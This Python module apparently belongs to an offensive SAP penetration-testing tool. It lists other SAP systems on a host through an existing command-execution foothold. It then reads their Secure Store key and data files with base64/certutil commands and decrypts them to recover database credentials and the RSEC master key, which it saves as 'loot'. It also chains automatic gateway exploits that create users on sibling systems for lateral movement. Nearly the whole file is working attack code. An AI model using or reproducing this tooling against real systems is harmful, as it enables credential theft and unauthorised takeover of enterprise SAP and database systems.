"""Same-host SAP instance discovery (issue #70).

When one SAP system on a host has an OS-command channel, other SAP systems
installed on the SAME host each live under ``/usr/sap/<SID>``.  This module
lists ``/usr/sap`` through the node's existing OS-exec channel, extracts the
other SIDs, and correlates them with systems already plotted on the map at the
same host/IP.  Unseen SIDs are materialized as dashed placeholder nodes (same
treatment as the other ``discovered_via_*`` placeholders) so they render in the
shared host zone.

This only READS the directory listing — it does not act on the co-located
systems.  The operator-triggered "pivot" (which reuses the existing per-node
Gateway primitive) lives in the GUI layer.
"""
from __future__ import annotations

import re

# A valid SAP SID is exactly three characters: an upper-case letter followed by
# two upper-case letters or digits.  /usr/sap's non-system entries (trans,
# hostctrl, tmp, ccms, …) are lower-case or longer, so the upper-case gate
# already excludes them; SYS is excluded explicitly for safety.
_SID_RE = re.compile(r"^[A-Z][A-Z0-9]{2}$")
_RESERVED = {"SYS", "TMP"}


def _canonical_sid(raw: str) -> str:
    """The bare SID of a node key, stripping the ``@<anchor>`` mangle that
    add_node applies to same-SID-different-host collisions."""
    return (raw or "").split("@", 1)[0].strip().upper()


def parse_colocated_sids(output_lines, own_sid: str) -> list:
    """Extract foreign SAP SIDs from a ``ls /usr/sap`` listing.

    Tolerates one-per-line and multi-column output (splits on whitespace),
    de-duplicates, drops this node's own SID and the reserved non-system dirs,
    and preserves first-seen order.
    """
    own = _canonical_sid(own_sid)   # strip any @<anchor> mangle on the key
    seen = set()
    out = []
    for line in (output_lines or []):
        for tok in str(line).split():
            sid = tok.strip().strip("/")
            if not _SID_RE.match(sid):
                continue
            if sid == own or sid in _RESERVED or sid in seen:
                continue
            seen.add(sid)
            out.append(sid)
    return out


def _plotted_same_host(state, sid: str, own_ips: set, own_names: set):
    """Return an existing plotted node with this SID on the same host, or None.

    Matches on IP OR hostname — the same host identity ``add_node``'s key
    resolver uses to merge — so a node plotted under a hostname with no
    intersecting IP (XML / message-server imports) still correlates and is not
    mistaken for a new system.
    """
    for n in state.nodes.values():
        if _canonical_sid(getattr(n, "sid", "")) != sid:
            continue
        try:
            if (set(n.all_ips()) & own_ips) or (set(n.all_hostnames()) & own_names):
                return n
        except Exception:
            if (getattr(n, "ip", "") in own_ips
                    or (getattr(n, "hostname", "") or "").lower() in own_names):
                return n
    return None


def discover_colocated_sids(node, state, run_cmd=None) -> dict:
    """List /usr/sap on ``node`` and correlate the other SIDs with the map.

    ``run_cmd`` defaults to sapmap_exploit.run_os_command (injectable for
    tests); it must accept ``(node, command, params)`` and return a dict with
    ``success`` (bool) and ``output`` (list of lines).

    Side effects: sets ``node.colocated_sids``; adds a dashed placeholder node
    (``discovered_via_colocation=True``) for each unseen co-located SID; emits
    one INFO finding.  Best-effort and non-fatal.

    Returns ``{"ok", "colocated", "placeholders_added", "reason"}``.
    """
    if run_cmd is None:
        from sapmap_exploit import run_os_command as run_cmd  # lazy — avoid cycle

    res = run_cmd(node, "ls", "/usr/sap")
    if not res or not res.get("success"):
        reason = (res or {}).get("error") or "no OS-command channel / listing failed"
        return {"ok": False, "colocated": [], "placeholders_added": [], "reason": reason}

    sids = parse_colocated_sids(res.get("output") or [], getattr(node, "sid", ""))

    own_ips, own_names = set(), set()
    try:
        own_ips = set(node.all_ips())
        own_names = set(node.all_hostnames())
    except Exception:
        if getattr(node, "ip", ""):
            own_ips = {node.ip}
        if getattr(node, "hostname", ""):
            own_names = {node.hostname.lower()}
    anchor = node.ip or node.hostname or ""

    colocated = []
    placeholders_added = []
    for sid in sids:
        plotted = _plotted_same_host(state, sid, own_ips, own_names) is not None
        if not plotted:
            try:
                from sapmap_models import SAPNode
                ph = SAPNode(sid=sid, ip=node.ip or "", hostname=node.hostname or "")
                ph.discovered_via_colocation = True
                ph.linked_target_sid = getattr(node, "sid", "")
                # Never overwrite an existing node: if add_node's key resolver
                # would land on one already present (e.g. an anchorless
                # placeholder), treat the SID as already plotted instead.
                key = state._resolve_add_node_key(ph)
                if key in state.nodes:
                    plotted = True
                else:
                    state.add_node(ph)
                    placeholders_added.append(ph.sid)  # add_node may re-key
            except Exception:
                pass
        colocated.append({"sid": sid, "ip": anchor, "plotted": plotted})

    node.colocated_sids = colocated

    if sids:
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", getattr(node, "sid", "?"),
                f"Co-located SAP instances on {anchor or 'host'}: "
                f"{', '.join(sids)} — same-host lateral candidates reachable "
                f"via their own RFC Gateway (issue #70).",
                ref="colocation.discovered",
            )
        except Exception:
            pass

    return {"ok": True, "colocated": colocated,
            "placeholders_added": placeholders_added, "reason": ""}


# ---------------------------------------------------------------------------
# Same-host secret harvest (issue #70, increment 1)
#
# When a co-located sibling's own RFC Gateway rejects a remote exploit (its
# gateway trusts only localhost / internal_hosts, and its SNC port enforces
# SNC), we can still reach it through the foothold we already hold on the
# SHARED host: the owned node's OS-exec channel can read the sibling's SAP
# Secure Store off ``/usr/sap/<SIB>/...`` and we decrypt it with the existing
# SecStore primitives.  That yields the sibling's DB-connect credentials
# (SAPSR3 schema owner, Sybase sysadmin) + RSEC master key — the foundation
# for a direct-DB pivot.  Best-effort and non-fatal: the sibling's SSFS is
# often ``0600 <sib>adm`` and a cross-SID read is simply denied, which we
# report cleanly (no regression vs. today's "discovered but not acted on").
# ---------------------------------------------------------------------------

def _same_host(a, b) -> bool:
    """True when nodes ``a`` and ``b`` resolve to the same host (IP or name)."""
    def _ips(n):
        try:
            return {x for x in (n.all_ips() or []) if x}
        except Exception:
            return {n.ip} if getattr(n, "ip", "") else set()

    def _names(n):
        try:
            return {x.lower() for x in (n.all_hostnames() or []) if x}
        except Exception:
            return {n.hostname.lower()} if getattr(n, "hostname", "") else set()

    return bool((_ips(a) & _ips(b)) or (_names(a) & _names(b)))


def _sibling_ssfs_paths(sib_sid: str, is_windows: bool):
    """Well-known SSFS KEY/DAT locations for an arbitrary sibling SID.

    Mirrors the layouts in sapmap_secstore._read_ssfs_files_via_sxpg, but keyed
    by the *sibling's* SID rather than the owned node's — because we read the
    files through the owned node's OS-exec channel on the shared host.
    """
    if is_windows:
        key_paths = [
            f"C:\\usr\\sap\\{sib_sid}\\SYS\\global\\security\\rsecssfs\\key\\SSFS_{sib_sid}.KEY",
        ]
        dat_paths = [
            f"C:\\usr\\sap\\{sib_sid}\\SYS\\global\\security\\rsecssfs\\data\\SSFS_{sib_sid}.DAT",
        ]
    else:
        key_paths = [
            f"/usr/sap/{sib_sid}/SYS/global/security/rsecssfs/key/SSFS_{sib_sid}.KEY",
            f"/sapmnt/{sib_sid}/global/security/rsecssfs/key/SSFS_{sib_sid}.KEY",
        ]
        dat_paths = [
            f"/usr/sap/{sib_sid}/SYS/global/security/rsecssfs/data/SSFS_{sib_sid}.DAT",
            f"/sapmnt/{sib_sid}/global/security/rsecssfs/data/SSFS_{sib_sid}.DAT",
        ]
    return key_paths, dat_paths


def _read_file_b64_via_os_exec(src_node, file_paths, run_exec, is_windows,
                               label=""):
    """Read a binary file through ``src_node``'s OS-exec channel by base64-
    encoding it on the remote side and decoding the output.  Reuses the same
    ``base64 <path>`` (Unix) / ``certutil -encode`` (Windows) approach as
    sapmap_secstore._read_ssfs_files_via_sxpg.  Returns (bytes|None, path_used).
    """
    import base64
    _B64 = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
    src_sid = getattr(src_node, "sid", "?")
    for fpath in file_paths:
        if is_windows:
            cmd, params = "cmd", (
                f'/c certutil -encode "{fpath}" "%TEMP%\\coloc_tmp.b64" '
                f'&& type "%TEMP%\\coloc_tmp.b64" && del "%TEMP%\\coloc_tmp.b64"')
        else:
            cmd, params = "base64", fpath
        print(f"[*] {src_sid}: reading {label or 'file'} {fpath} via OS-exec "
              f"({cmd}) ...")
        try:
            res = run_exec(src_node, cmd, params)
        except Exception as e:
            print(f"[-] {src_sid}:   OS-exec raised for {fpath}: {e}")
            continue
        if not res or not res.get("success") or not res.get("output"):
            err = (res or {}).get("error") or "no output / channel refused"
            print(f"[-] {src_sid}:   {fpath} not read ({err})")
            continue
        b64 = []
        for line in res["output"]:
            clean = line.strip()
            if (clean.startswith("-----") or "CertUtil" in clean
                    or "Input Length" in clean or "Output Length" in clean):
                continue
            chars = "".join(c for c in clean if c in _B64)
            if chars:
                b64.append(chars)
        b64_str = "".join(b64)
        if len(b64_str) < 10:
            print(f"[-] {src_sid}:   {fpath} returned no base64 payload "
                  f"(likely permission denied or empty)")
            continue
        try:
            raw = base64.b64decode(b64_str)
        except Exception:
            print(f"[-] {src_sid}:   {fpath} base64 decode failed")
            continue
        if raw:
            print(f"[+] {src_sid}:   read {len(raw)} bytes of {label or 'file'} "
                  f"from {fpath}")
            return raw, fpath
    return None, ""


def harvest_colocated_secrets(src_node, target_node, state, run_exec=None) -> dict:
    """Read and decrypt a co-located sibling's Secure Store through the owned
    node's OS-exec channel on the shared host (issue #70, increment 1).

    ``run_exec(node, command, params) -> {"success", "output", "error"}`` is
    injectable for tests; it defaults to sapmap_exploit.run_os_command.

    Returns ``{ok, sid, db_creds, rsec_key_found, loot_path, reason}``.  Never
    raises — a denied read / missing file / decrypt failure yields ``ok=False``
    with a reason and an INFO finding.
    """
    sib_sid = _canonical_sid(getattr(target_node, "sid", ""))
    src_sid = getattr(src_node, "sid", "?")
    anchor = getattr(src_node, "ip", "") or getattr(src_node, "hostname", "") or "host"
    result = {"ok": False, "sid": sib_sid, "db_creds": [],
              "rsec_key_found": False, "loot_path": "", "reason": ""}

    if not sib_sid:
        result["reason"] = "no target SID"
        return result
    if not _SID_RE.match(sib_sid):
        # Defence-in-depth: the SID flows into OS paths + commands.  Discovery
        # already charset-validates, but never trust a caller-supplied SID.
        result["reason"] = f"refusing to harvest — '{sib_sid}' is not a valid SID"
        return result
    if sib_sid == _canonical_sid(getattr(src_node, "sid", "")):
        result["reason"] = "target is the source node"
        return result
    if not _same_host(src_node, target_node):
        result["reason"] = f"{sib_sid} is not on the same host as {src_sid}"
        return result

    if run_exec is None:
        try:
            from sapmap_exploit import run_os_command as run_exec
        except Exception as e:
            result["reason"] = f"no OS-exec channel available: {e}"
            return result

    try:
        from sapmap_findings import emit_finding
    except Exception:
        emit_finding = lambda *a, **k: None  # noqa: E731

    print(f"[*] {src_sid}: same-host Secure-Store harvest → reading {sib_sid}'s "
          f"SSFS off /usr/sap/{sib_sid} through {src_sid}'s OS-exec channel on "
          f"{anchor} (issue #70)")
    # The OS that decides base64 vs certutil is the host running the exec
    # channel — the OWNED (source) node.  Siblings are frequently placeholders
    # with an empty os_type, so never key the command choice off target_node.
    _ostype = (getattr(src_node, "os_type", "")
               or getattr(target_node, "os_type", "") or "")
    is_windows = _ostype.lower() in ("windows", "win", "nt")
    key_paths, dat_paths = _sibling_ssfs_paths(sib_sid, is_windows)
    key_bytes, _ = _read_file_b64_via_os_exec(
        src_node, key_paths, run_exec, is_windows, label=f"{sib_sid} SSFS KEY")
    dat_bytes, dat_path = _read_file_b64_via_os_exec(
        src_node, dat_paths, run_exec, is_windows, label=f"{sib_sid} SSFS DAT")

    # Recover the SSFS master key regardless of the DAT outcome — a readable
    # KEY is itself a signal worth keeping (and it feeds DAT decryption).
    try:
        from sapmap_secstore import extract_ssfs_key, extract_sybase_kernel_creds
    except Exception as e:
        result["reason"] = f"SecStore decrypt unavailable: {e}"
        return result
    ssfs_key = None
    if key_bytes:
        try:
            ssfs_key = extract_ssfs_key(key_bytes)
        except Exception:
            ssfs_key = None
    result["rsec_key_found"] = ssfs_key is not None

    if not dat_bytes:
        if result["rsec_key_found"]:
            result["reason"] = (f"read {sib_sid}'s SSFS KEY (master key "
                                f"recovered) but its DAT was denied/not present "
                                f"— store contents unavailable")
        else:
            result["reason"] = (f"could not read {sib_sid}'s SSFS via "
                                f"{src_sid}'s OS shell on {anchor} — denied "
                                f"(0600 {sib_sid.lower()}adm) or not present")
        print(f"[-] {sib_sid}: {result['reason']}")
        emit_finding("INFO", sib_sid,
                     f"Co-located secret harvest: {result['reason']} (issue #70).",
                     ref="colocation.secret_harvest")
        return result

    try:
        print(f"[*] {sib_sid}: decrypting SSFS — "
              f"{'individual key recovered from KEY file' if ssfs_key else 'no KEY file; trying SAP default key'}")
        creds = extract_sybase_kernel_creds(dat_bytes, ssfs_key)
    except Exception as e:
        result["reason"] = f"read {sib_sid}'s SSFS but decryption failed: {e}"
        print(f"[-] {sib_sid}: {result['reason']}")
        emit_finding("INFO", sib_sid,
                     f"Co-located secret harvest: {result['reason']} (issue #70).",
                     ref="colocation.secret_harvest")
        return result

    for user_key, pw_key, role in (
            ("sapsr3_user", "sapsr3_password", "ABAP schema owner"),
            ("sapsa_user", "sapsa_password", "DB sysadmin"),
    ):
        user = (creds.get(user_key) or "").strip()
        if not user:
            continue
        pw = creds.get(pw_key) or ""
        result["db_creds"].append({"user": user, "role": role,
                                   "has_password": bool(pw), "password": pw})
        print(f"[+] {sib_sid}: recovered DB-connect credential '{user}' ({role}) "
              f"{'[with password]' if pw else '[username only — no SSFS key]'}")

    result["ok"] = bool(result["db_creds"]) or result["rsec_key_found"]

    if result["db_creds"]:
        print(f"[+] {sib_sid}: harvest recovered {len(result['db_creds'])} "
              f"DB-connect credential(s) — direct-DB pivot foundation")
        for rc in result["db_creds"]:
            sev = "HIGH" if rc["has_password"] else "INFO"
            tail = (" — direct-DB pivot available" if rc["has_password"]
                    else " — password not decryptable (no SSFS key on disk)")
            emit_finding(sev, sib_sid,
                         f"Co-located secret harvest: recovered {sib_sid} "
                         f"DB-connect credential '{rc['user']}' ({rc['role']}) "
                         f"from its SSFS via {src_sid}'s OS shell on {anchor}"
                         f"{tail} (issue #70).",
                         ref="colocation.secret_harvest")
        result["loot_path"] = _write_harvest_loot(sib_sid, src_sid, result)
    elif result["rsec_key_found"]:
        emit_finding("INFO", sib_sid,
                     f"Co-located secret harvest: read {sib_sid}'s SSFS via "
                     f"{src_sid}'s OS shell and recovered its RSEC master key, "
                     f"but no DB-connect credentials were present (likely a HANA "
                     f"system — connect creds live in {sib_sid.lower()}adm's "
                     f"hdbuserstore). (issue #70)",
                     ref="colocation.secret_harvest")
    else:
        result["reason"] = f"read {sib_sid}'s SSFS but recovered no usable secrets"

    return result


def _write_harvest_loot(sib_sid: str, src_sid: str, result: dict) -> str:
    """Persist recovered co-located secrets as a loot JSON (same convention as
    SecStore loot).  Returns the file path, or "" on failure.  Passwords are
    written to loot but never printed to the console/findings."""
    try:
        import os
        import json
        from datetime import datetime
        from sapmap_state import ensure_loot_dir
        loot_dir = ensure_loot_dir("colocation")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(loot_dir, f"colocation_{sib_sid}_{ts}.json")
        payload = {
            "sibling_sid": sib_sid,
            "harvested_via": src_sid,
            "rsec_key_found": result.get("rsec_key_found", False),
            "db_creds": result.get("db_creds", []),
        }
        with open(path, "w") as f:
            json.dump(payload, f, indent=2)
        print(f"[+] Co-located harvest: {sib_sid} secrets written to {path}")
        return path
    except Exception as e:
        print(f"[-] Co-located harvest: could not write loot for {sib_sid}: {e}")
        return ""


# ---------------------------------------------------------------------------
# Co-located pivot orchestration (issue #70)
#
# One shared routine drives both the operator-triggered pivot (the GUI route)
# and the automatic post-ownership pivot (from _post_exploit_enrichment): own
# one system on a host and SAPMAP attempts its same-host neighbours — each
# sibling's own RFC Gateway first, then the same-host Secure-Store harvest when
# that gateway rejects a remote exploit.
# ---------------------------------------------------------------------------

import threading as _threading

_PIVOT_CHAIN_LOCK = _threading.Lock()
_PIVOT_IN_PROGRESS = set()   # src SIDs whose auto-pivot chain is currently live


def _resolve_same_host_targets(src_node, state, only_sid=None):
    """Resolve src_node.colocated_sids to plotted nodes ON THE SAME HOST.

    Matches on IP *or* hostname so a same-SID node on a *different* host (e.g.
    DAA@10.10.1.5 vs DAA@10.10.1.6) is never picked by accident."""
    src_sid = _canonical_sid(getattr(src_node, "sid", ""))
    try:
        own_ips = {x for x in (src_node.all_ips() or []) if x}
        own_names = {x.lower() for x in (src_node.all_hostnames() or []) if x}
    except Exception:
        own_ips = {getattr(src_node, "ip", "")} - {""}
        own_names = ({getattr(src_node, "hostname", "").lower()} - {""})
    only = _canonical_sid(only_sid) if only_sid else None

    targets = []
    for c in (getattr(src_node, "colocated_sids", None) or []):
        if not c.get("plotted"):
            continue
        tsid = _canonical_sid(c.get("sid"))
        if not tsid or tsid == src_sid or (only and tsid != only):
            continue
        for n in state.nodes.values():
            if _canonical_sid(getattr(n, "sid", "")) != tsid:
                continue
            try:
                n_ips = {x for x in (n.all_ips() or []) if x}
                n_names = {x.lower() for x in (n.all_hostnames() or []) if x}
            except Exception:
                n_ips, n_names = set(), set()
            if ((n_ips & own_ips) or (n_names & own_names)) and n not in targets:
                targets.append(n)
                break
    return targets


def pivot_colocated(src_node, state, only_sid=None, auto=False) -> dict:
    """Pivot from an owned node to its co-located same-host sibling systems.

    For each plotted sibling on the same host that is not already owned: try its
    own RFC Gateway (``create_user_gw_exploit``); when that is rejected (the
    sibling's gateway trusts only localhost / internal_hosts), fall back to the
    same-host Secure-Store harvest through THIS node's OS-exec channel.

    ``only_sid`` restricts to one sibling (the per-target GUI action).  ``auto``
    marks the automatic post-ownership run and is loop-guarded: an
    AE1 → AE3 → AE1 cascade terminates (already-owned siblings are skipped and a
    src already mid-chain is not re-entered).  Never raises.
    """
    src_sid = _canonical_sid(getattr(src_node, "sid", ""))
    summary = {"src": src_sid, "owned": [], "harvested": [], "skipped": []}

    if auto:
        with _PIVOT_CHAIN_LOCK:
            if src_sid in _PIVOT_IN_PROGRESS:
                return summary
            _PIVOT_IN_PROGRESS.add(src_sid)
    try:
        targets = _resolve_same_host_targets(src_node, state, only_sid=only_sid)
        if not targets:
            return summary

        import sapmap_exploit
        for tnode in targets:
            tsid = getattr(tnode, "sid", "?")
            if getattr(tnode, "pwned", False):
                print(f"[*] {src_sid}: co-located {tsid} already owned — "
                      f"skipping pivot")
                summary["skipped"].append(tsid)
                continue
            owned = False
            try:
                print(f"[*] {src_sid}: {'auto-' if auto else ''}pivoting to "
                      f"co-located {tsid} on {tnode.ip or tnode.hostname} via its "
                      f"RFC Gateway (issue #70)")
                created = sapmap_exploit.create_user_gw_exploit(tnode, state)
                if created:
                    state.track_created_user(created)
                    sapmap_exploit._post_exploit_enrichment(
                        tnode, state, proven_type="ABAP")
                    owned = True
                    summary["owned"].append(tsid)
                    print(f"[+] {src_sid}: co-located {tsid} owned via Gateway "
                          f"pivot")
                else:
                    print(f"[-] {src_sid}: Gateway pivot to {tsid} did not succeed "
                          f"(its gateway likely trusts only localhost / "
                          f"internal_hosts) — falling back to same-host secret "
                          f"harvest")
            except Exception as e:
                print(f"[-] {src_sid}: Gateway pivot to {tsid} error: {e} — "
                      f"falling back to same-host secret harvest")
            if owned:
                continue
            try:
                hv = harvest_colocated_secrets(src_node, tnode, state)
                if hv.get("ok"):
                    summary["harvested"].append(tsid)
                    n = len(hv.get("db_creds") or [])
                    extra = (f", loot → {hv['loot_path']}"
                             if hv.get("loot_path") else "")
                    print(f"[+] {src_sid}: same-host harvest of {tsid} — "
                          f"{n} DB-connect credential(s) recovered{extra}")
                else:
                    print(f"[-] {src_sid}: same-host harvest of {tsid}: "
                          f"{hv.get('reason') or 'no secrets recovered'}")
            except Exception as e:
                print(f"[-] {src_sid}: same-host harvest of {tsid} error: {e}")
        return summary
    finally:
        if auto:
            with _PIVOT_CHAIN_LOCK:
                _PIVOT_IN_PROGRESS.discard(src_sid)
